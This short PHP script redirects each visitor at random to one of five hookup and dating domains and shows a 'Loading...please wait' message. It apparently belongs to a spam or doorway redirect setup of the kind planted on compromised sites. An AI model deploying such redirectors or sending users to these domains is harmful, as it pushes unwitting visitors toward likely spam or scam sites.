<?php
$urls = array("flirtpickup.top",
              "easydating.top",
              "findeasyhookup.com",
              "allsugardating.com",
              "startflirtnow.net");
$url = $urls[array_rand($urls)];
header("Location: http://$url");
echo "Loading...please wait";
?>

